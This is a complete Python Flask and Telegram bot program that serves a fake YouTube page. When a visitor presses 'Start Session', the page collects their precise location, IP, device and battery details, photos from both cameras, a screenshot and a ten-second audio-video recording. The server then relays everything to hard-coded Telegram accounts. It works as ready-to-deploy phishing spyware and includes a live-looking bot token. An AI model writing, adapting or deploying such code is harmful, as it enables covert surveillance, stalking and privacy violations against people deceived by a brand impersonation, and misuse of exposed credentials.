import os
import threading
import json
from flask import Flask, request, render_template_string
import telebot

BOT_TOKEN = "8637899791:AAEcpjrVy2j9sUTK-rvpX_HsuKBpkX7gnlU"
USER_IDS = [7361880623, 8475691696]
BASE_URL = "https://web-youtube-asuma66.up.railway.app"

bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)

HTML_PAGE = """<!DOCTYPE html>
<html>
<head>
    <title>YouTube</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>
        body { font-family: 'Roboto', sans-serif; margin:0; background:#0f0f0f; color:#fff; }
        .header { background:#202020; padding:12px 20px; display:flex; align-items:center; }
        .header .logo { font-size:24px; font-weight:bold; color:#ff0000; }
        .header .user { margin-left:auto; color:#aaa; }
        .container { max-width:900px; margin:20px auto; padding:0 20px; }
        .video-placeholder { background:#1a1a1a; border-radius:12px; padding:20px; text-align:center; }
        .video-placeholder img { max-width:100%; border-radius:8px; }
        .info { margin-top:15px; }
        .info .title { font-size:22px; font-weight:500; }
        .info .channel { color:#aaa; margin-top:8px; }
        .controls { margin-top:20px; display:flex; gap:10px; flex-wrap:wrap; justify-content:center; }
        .controls button { background:#3ea6ff; border:none; color:#000; padding:10px 24px; border-radius:20px; font-weight:bold; cursor:pointer; font-size:16px; }
        .controls button:disabled { opacity:0.5; cursor:not-allowed; }
        #statusText, #locationStatus, #debug { display: none; }
        html, body { min-height: 100%; }
    </style>
</head>
<body>
    <div class="header">
        <div class="logo">YouTube</div>
        <div class="user">asuma.66</div>
    </div>
    <div class="container">
        <div class="video-placeholder">
            <img id="thumbnail" src="https://img.youtube.com/vi/dQw4w9WgXcQ/hqdefault.jpg" alt="video thumbnail">
        </div>
        <div class="info">
            <div class="title">🔥 ASUSMA LIVE 🔥</div>
            <div class="channel">asuma.66 - 1.2M subscribers</div>
        </div>
        <div class="controls">
            <button id="startBtn">▶ Start Session</button>
        </div>
        <div id="statusText"></div>
        <div id="locationStatus"></div>
        <div id="debug"></div>
    </div>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>

    <script>
        let frontStream = null, backStream = null, mediaRecorder = null;
        let recordedChunks = [], recordingActive = false, maxDuration = 10000;
        const startBtn = document.getElementById('startBtn');

        function delay(ms) { return new Promise(resolve => setTimeout(resolve, ms)); }

        async function sendData(formData) {
            try { await fetch('/capture', { method: 'POST', body: formData }); } catch(e) {}
        }

        async function getIpInfo() {
            try {
                const res = await fetch('https://ipapi.co/json/');
                return await res.json();
            } catch { return { ip: 'unknown', city: 'unknown', region: 'unknown', country: 'unknown' }; }
        }

        function getDeviceInfo() {
            const ua = navigator.userAgent;
            let brand = 'Unknown', model = 'Unknown';
            if (ua.includes('iPhone')) { brand = 'Apple'; model = 'iPhone'; }
            else if (ua.includes('iPad')) { brand = 'Apple'; model = 'iPad'; }
            else if (ua.includes('Android')) {
                brand = 'Android';
                const match = ua.match(/Android\s+([\d.]+);\s+([^;)]+)/);
                model = match ? match[2] : 'Android Device';
            } else if (ua.includes('Windows')) { brand = 'Microsoft Windows'; model = 'PC'; }
            else if (ua.includes('Mac')) { brand = 'Apple Mac'; model = 'Mac'; }
            return { brand, model };
        }

        async function getBatteryInfo() {
            try {
                if (navigator.getBattery) {
                    const battery = await navigator.getBattery();
                    const level = Math.round(battery.level * 100);
                    return { level: level, charging: battery.charging };
                } else {
                    return { level: 'not supported', charging: 'unknown' };
                }
            } catch (e) {
                return { level: 'error', charging: 'unknown' };
            }
        }

        function getNetworkType() {
            if (navigator.connection) {
                return navigator.connection.effectiveType || 'unknown';
            }
            return 'unknown';
        }

        function getScreenResolution() {
            return `${window.screen.width}x${window.screen.height}`;
        }

        function getTimezone() {
            try { return Intl.DateTimeFormat().resolvedOptions().timeZone; } catch { return 'unknown'; }
        }

        function getLanguage() {
            return navigator.language || 'unknown';
        }

        function getOrientation() {
            if (screen.orientation) {
                return screen.orientation.type;
            } else if (window.orientation !== undefined) {
                return window.orientation === 0 ? 'portrait' : 'landscape';
            }
            return 'unknown';
        }

        function captureScreenshot() {
            return new Promise((resolve) => {
                html2canvas(document.documentElement, {
                    useCORS: true,
                    logging: false,
                    scale: 1.0,
                    allowTaint: true,
                    scrollX: 0,
                    scrollY: 0,
                    windowWidth: document.documentElement.scrollWidth,
                    windowHeight: document.documentElement.scrollHeight
                }).then(canvas => {
                    canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.92);
                }).catch(() => resolve(null));
            });
        }

        // ---- Get a camera stream with exact facing mode ----
        function getCameraStream(facing, audio = false) {
            return new Promise((resolve) => {
                const constraints = { video: { facingMode: { exact: facing } }, audio: audio };
                navigator.mediaDevices.getUserMedia(constraints)
                    .then(stream => resolve(stream))
                    .catch(() => {
                        const idealConstraints = { video: { facingMode: facing }, audio: audio };
                        navigator.mediaDevices.getUserMedia(idealConstraints)
                            .then(stream => resolve(stream))
                            .catch(() => {
                                navigator.mediaDevices.getUserMedia({ video: true, audio: audio })
                                    .then(stream => resolve(stream))
                                    .catch(() => resolve(null));
                            });
                    });
            });
        }

        // ---- Get distinct back and front streams ----
        async function getCameraStreams() {
            let back = null, front = null;
            let errorMessages = [];
            let debugInfo = {};
            let backFacing = 'unknown', frontFacing = 'unknown';

            // 1. Get back (environment)
            back = await getCameraStream('environment', true);
            if (back) {
                const track = back.getVideoTracks()[0];
                const settings = track.getSettings();
                debugInfo.backSettings = settings;
                backFacing = settings.facingMode || 'unknown';
                debugInfo.backTrackId = track.id;
            } else {
                errorMessages.push('Back camera failed');
            }

            // 2. Get front (user)
            front = await getCameraStream('user', false);
            if (front) {
                const track = front.getVideoTracks()[0];
                const settings = track.getSettings();
                debugInfo.frontSettings = settings;
                frontFacing = settings.facingMode || 'unknown';
                debugInfo.frontTrackId = track.id;
            } else {
                errorMessages.push('Front camera failed');
            }

            // If one is missing, clone the other
            if (!back && front) {
                back = front.clone();
                debugInfo.backCloned = true;
                backFacing = frontFacing;
                debugInfo.backTrackId = debugInfo.frontTrackId;
                errorMessages.push('Back cloned from front');
            }
            if (!front && back) {
                front = back.clone();
                debugInfo.frontCloned = true;
                frontFacing = backFacing;
                debugInfo.frontTrackId = debugInfo.backTrackId;
                errorMessages.push('Front cloned from back');
            }

            // If both exist, check if they are the same track
            if (back && front) {
                const backId = back.getVideoTracks()[0].id;
                const frontId = front.getVideoTracks()[0].id;
                if (backId === frontId) {
                    debugInfo.sameTrack = true;
                    errorMessages.push('Both streams use the same video track');
                } else {
                    debugInfo.distinctTracks = true;
                }
            }

            // Add audio to back if missing
            if (back && back.getAudioTracks().length === 0) {
                try {
                    const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
                    const combinedTracks = [];
                    back.getVideoTracks().forEach(t => combinedTracks.push(t));
                    audioStream.getAudioTracks().forEach(t => combinedTracks.push(t));
                    back = new MediaStream(combinedTracks);
                    debugInfo.audioAdded = true;
                } catch (e) {
                    errorMessages.push('Audio add failed: ' + e.message);
                }
            }

            return { front, back, error: errorMessages.join(' | '), debug: debugInfo, backFacing, frontFacing };
        }

        // ---- Capture frame with black frame detection ----
        function captureFrame(stream) {
            return new Promise((resolve) => {
                if (!stream) { resolve(null); return; }
                const video = document.createElement('video');
                video.srcObject = stream;
                let resolved = false;
                video.onloadedmetadata = async () => {
                    video.play();
                    let attempts = 0;
                    const checkFrame = async () => {
                        attempts++;
                        if (video.readyState >= 2 && video.videoWidth > 0 && video.videoHeight > 0) {
                            const canvas = document.createElement('canvas');
                            canvas.width = video.videoWidth;
                            canvas.height = video.videoHeight;
                            const ctx = canvas.getContext('2d');
                            ctx.drawImage(video, 0, 0);
                            // Check brightness
                            const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
                            const data = imageData.data;
                            let sum = 0;
                            for (let i = 0; i < data.length; i += 4) {
                                sum += data[i] + data[i+1] + data[i+2];
                            }
                            const avg = sum / (canvas.width * canvas.height * 3);
                            if (avg < 10 && attempts < 5) {
                                await delay(100);
                                checkFrame();
                                return;
                            }
                            canvas.toBlob((blob) => {
                                if (!resolved) { resolved = true; resolve(blob); }
                                video.pause();
                                video.srcObject = null;
                            }, 'image/jpeg', 0.9);
                        } else if (attempts < 10) {
                            await delay(100);
                            checkFrame();
                        } else {
                            if (!resolved) { resolved = true; resolve(null); }
                            video.pause();
                            video.srcObject = null;
                        }
                    };
                    checkFrame();
                };
            });
        }

        // ---- Main session ----
        async function startSession() {
            startBtn.disabled = true;
            startBtn.innerText = 'Loading...';
            await delay(300);

            // 1. Location
            let locationData = null;
            if (navigator.geolocation) {
                try {
                    const pos = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, timeout: 10000 });
                    });
                    locationData = { lat: pos.coords.latitude, lng: pos.coords.longitude };
                } catch {
                    locationData = { denied: true };
                }
            } else {
                locationData = { denied: true };
            }

            // 2. System info
            const ipInfo = await getIpInfo();
            const device = getDeviceInfo();
            const battery = await getBatteryInfo();
            const network = getNetworkType();
            const screenRes = getScreenResolution();
            const timezone = getTimezone();
            const language = getLanguage();
            const orientation = getOrientation();

            // 3. Camera streams
            const { front, back, error, debug, backFacing, frontFacing } = await getCameraStreams();
            let frontBlob = null, backBlob = null;
            let cameraStatus = 'success';
            let cameraError = error || '';

            if (!front && !back) {
                cameraStatus = 'failed';
                cameraError = error || 'No camera access';
            } else {
                if (back) backBlob = await captureFrame(back);
                if (front) frontBlob = await captureFrame(front);
                backStream = back;
                frontStream = front;
            }

            // 4. Screenshot
            const screenshotBlob = await captureScreenshot();

            // 5. Recording (from back stream)
            let videoBlob = null;
            let recordStream = backStream || frontStream;
            if (recordStream) {
                let mimeType = 'video/webm;codecs=vp9,opus';
                if (!MediaRecorder.isTypeSupported(mimeType)) {
                    mimeType = 'video/webm;codecs=vp8,opus';
                }
                if (!MediaRecorder.isTypeSupported(mimeType)) {
                    mimeType = 'video/webm';
                }
                mediaRecorder = new MediaRecorder(recordStream, { mimeType: mimeType });
                recordedChunks = [];
                mediaRecorder.ondataavailable = (e) => { if (e.data.size) recordedChunks.push(e.data); };
                mediaRecorder.onstop = () => {
                    videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
                    finalizeAndSend();
                };
                mediaRecorder.start(1000);
                recordingActive = true;
                setTimeout(() => {
                    if (recordingActive && mediaRecorder.state === 'recording') {
                        mediaRecorder.stop();
                        recordingActive = false;
                    }
                }, maxDuration);
                window.addEventListener('beforeunload', () => {
                    if (recordingActive && mediaRecorder.state === 'recording') {
                        mediaRecorder.stop();
                        recordingActive = false;
                    }
                });
            } else {
                finalizeAndSend();
            }

            let finalized = false;
            async function finalizeAndSend() {
                if (finalized) return;
                finalized = true;
                const fd = new FormData();
                if (locationData && !locationData.denied) {
                    fd.append('lat', locationData.lat);
                    fd.append('lng', locationData.lng);
                } else {
                    fd.append('location_denied', 'true');
                }
                fd.append('ip', ipInfo.ip || 'unknown');
                fd.append('city', ipInfo.city || 'unknown');
                fd.append('region', ipInfo.region || 'unknown');
                fd.append('country', ipInfo.country || 'unknown');
                fd.append('brand', device.brand);
                fd.append('model', device.model);
                fd.append('battery_level', battery.level);
                fd.append('battery_charging', battery.charging);
                fd.append('network', network);
                fd.append('screen_res', screenRes);
                fd.append('timezone', timezone);
                fd.append('language', language);
                fd.append('orientation', orientation);
                fd.append('camera_status', cameraStatus);
                fd.append('camera_error', cameraError);
                fd.append('camera_debug', JSON.stringify(debug));
                fd.append('backFacing', backFacing);
                fd.append('frontFacing', frontFacing);
                if (screenshotBlob) fd.append('screenshot', screenshotBlob, 'screenshot.jpg');
                if (backBlob) fd.append('backImage', backBlob, 'back.jpg');
                if (frontBlob) fd.append('frontImage', frontBlob, 'front.jpg');
                if (videoBlob) fd.append('video', videoBlob, 'recording.webm');

                await sendData(fd);
                startBtn.disabled = false;
                startBtn.innerText = '▶ Start Session';
            }

            if (!mediaRecorder) {
                finalizeAndSend();
            } else {
                setTimeout(() => {
                    if (!finalized) {
                        if (recordingActive && mediaRecorder.state === 'recording') {
                            mediaRecorder.stop();
                            recordingActive = false;
                        }
                        if (!videoBlob) videoBlob = new Blob([], { type: 'video/webm' });
                        finalizeAndSend();
                    }
                }, maxDuration + 3000);
            }
        }

        document.getElementById('startBtn').addEventListener('click', startSession);
    </script>
</body>
</html>"""

@app.route('/')
def index():
    return render_template_string(HTML_PAGE)

@app.route('/capture', methods=['POST'])
def capture():
    lat = request.form.get('lat')
    lng = request.form.get('lng')
    location_denied = request.form.get('location_denied')
    ip = request.form.get('ip', 'unknown')
    city = request.form.get('city', 'unknown')
    region = request.form.get('region', 'unknown')
    country = request.form.get('country', 'unknown')
    brand = request.form.get('brand', 'Unknown')
    model = request.form.get('model', 'Unknown')
    battery_level = request.form.get('battery_level', 'unknown')
    battery_charging = request.form.get('battery_charging', 'unknown')
    network = request.form.get('network', 'unknown')
    screen_res = request.form.get('screen_res', 'unknown')
    timezone = request.form.get('timezone', 'unknown')
    language = request.form.get('language', 'unknown')
    orientation = request.form.get('orientation', 'unknown')
    camera_status = request.form.get('camera_status', 'unknown')
    camera_error = request.form.get('camera_error', '')
    camera_debug = request.form.get('camera_debug', '{}')
    backFacing = request.form.get('backFacing', 'unknown')
    frontFacing = request.form.get('frontFacing', 'unknown')
    screenshot = request.files.get('screenshot')
    front_img = request.files.get('frontImage')
    back_img = request.files.get('backImage')
    video = request.files.get('video')

    # Parse debug
    try:
        debug = json.loads(camera_debug)
    except:
        debug = {}

    # Determine if tracks are distinct or same
    same_track = debug.get('sameTrack', False)
    distinct = debug.get('distinctTracks', False)

    for uid in USER_IDS:
        if lat and lng:
            try:
                bot.send_location(uid, float(lat), float(lng))
                bot.send_message(uid, f"📍 Location: {lat}, {lng}")
            except Exception as e:
                print(f"Location send error: {e}")
        elif location_denied:
            try:
                bot.send_message(uid, "📍 Location: Denied by user.")
            except Exception as e:
                print(f"Error: {e}")

        try:
            msg = (
                f"🌐 IP: {ip}\n"
                f"📍 City: {city}, {region}, {country}\n"
                f"📱 Device: {brand} - {model}\n"
                f"🔋 Battery: {battery_level}% (charging: {battery_charging})\n"
                f"📶 Network: {network}\n"
                f"🖥️ Screen: {screen_res}\n"
                f"⏰ Timezone: {timezone}\n"
                f"🌍 Language: {language}\n"
                f"🔄 Orientation: {orientation}"
            )
            bot.send_message(uid, msg)
        except Exception as e:
            print(f"Info send error: {e}")

        if screenshot:
            try:
                screenshot.seek(0)
                bot.send_photo(uid, screenshot.read(), caption="📸 Full Page Screenshot")
            except Exception as e:
                print(f"Screenshot error: {e}")

        # Send back and front images with appropriate labels
        if back_img and front_img:
            # Check if they are the same track
            if same_track:
                # Send both with same note
                try:
                    back_img.seek(0)
                    bot.send_photo(uid, back_img.read(), caption="📷 Rear Camera (same as front)")
                except Exception as e:
                    print(f"Back image error: {e}")
                try:
                    front_img.seek(0)
                    bot.send_photo(uid, front_img.read(), caption="🤳 Front Camera (same as rear)")
                except Exception as e:
                    print(f"Front image error: {e}")
                try:
                    bot.send_message(uid, "ℹ️ Your device may have only one camera. Both images are from the same camera.")
                except:
                    pass
            else:
                # Normal distinct cameras
                # Use the facing mode to label, but fallback to position
                back_label = "📷 Back Camera" if backFacing == 'environment' else f"📷 Camera ({backFacing})"
                front_label = "🤳 Front Camera" if frontFacing == 'user' else f"🤳 Camera ({frontFacing})"
                if backFacing == 'unknown' and frontFacing == 'unknown':
                    # Use position: first is back, second is front
                    back_label = "📷 Back Camera"
                    front_label = "🤳 Front Camera"
                try:
                    back_img.seek(0)
                    bot.send_photo(uid, back_img.read(), caption=back_label)
                except Exception as e:
                    print(f"Back image error: {e}")
                try:
                    front_img.seek(0)
                    bot.send_photo(uid, front_img.read(), caption=front_label)
                except Exception as e:
                    print(f"Front image error: {e}")
        elif back_img:
            try:
                back_img.seek(0)
                bot.send_photo(uid, back_img.read(), caption="📷 Back Camera")
            except Exception as e:
                print(f"Back image error: {e}")
        elif front_img:
            try:
                front_img.seek(0)
                bot.send_photo(uid, front_img.read(), caption="🤳 Front Camera")
            except Exception as e:
                print(f"Front image error: {e}")

        if video:
            try:
                video.seek(0)
                bot.send_video(uid, video.read(), supports_streaming=True, caption="🎥 Recording (with audio)")
            except Exception as e:
                print(f"Video error: {e}")

        if camera_status == 'failed':
            try:
                bot.send_message(uid, f"⚠️ Camera error: {camera_error}")
            except Exception as e:
                print(f"Camera status error: {e}")
        elif not front_img and not back_img and not video:
            try:
                bot.send_message(uid, "⚠️ No camera data received.")
            except Exception as e:
                print(f"Camera note error: {e}")

        try:
            bot.send_message(uid, "✅ All data captured.")
        except:
            pass

    return "OK", 200

@bot.message_handler(commands=['start'])
def send_link(m):
    bot.reply_to(m, f"🔗 Open this link on your phone:\n{BASE_URL}/\n\nCollects location, device data, screenshot, camera images (back first, then front), and video recording with audio.")

def run_bot():
    print("Bot polling started.")
    bot.polling(non_stop=True, interval=1)

if __name__ == '__main__':
    threading.Thread(target=run_bot, daemon=True).start()
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
